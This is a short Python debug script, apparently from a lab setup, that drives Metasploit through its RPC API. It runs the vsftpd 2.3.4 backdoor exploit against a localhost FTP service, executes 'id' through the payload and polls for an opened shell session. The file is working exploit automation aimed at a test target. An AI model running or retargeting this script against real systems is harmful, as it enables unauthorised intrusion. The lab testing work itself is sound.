"""Debug #3: ejecuta el modulo y monitorea consola+sesiones en tiempo real."""
import os
import time

from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient(
    password="whlab-test-pass", username="msfapi", server="127.0.0.1",
    port=55553, uri="/api/", ssl=True,
)
console = client.consoles.console()
print("console:", console.cid)
console.write("use exploit/unix/ftp/vsftpd_234_backdoor\n")
console.write("set RHOSTS 127.0.0.1\n")
console.write("set RPORT 2121\n")
console.write("set PAYLOAD cmd/unix/generic\n")
console.write("set CMD id\n")
console.write("set VERBOSE 1\n")
console.write("run\n")

start = time.time()
buf = ""
while time.time() - start < 75:
    time.sleep(3)
    data = console.read()
    if data.get("data"):
        buf += data["data"]
    sess = client.sessions.list
    tail = buf[-160:].replace("\n", " | ")
    print(f"[{int(time.time()-start):3d}s] sesiones={len(sess)} :: {tail[-120:]}")
    if sess:
        sid = list(sess.keys())[0]
        print("SESION ABIERTA:", sid, list(sess.values())[0].get("desc", ""))
        sh = client.sessions.session(sid)
        sh.write("id\n")
        time.sleep(2)
        print("output de la sesion:", sh.read()[:200])
        break
    if not data.get("busy") and "spawned" in buf and time.time() - start > 40:
        print("sin sesion tras 40s de 'spawned'; sigo hasta 75s")
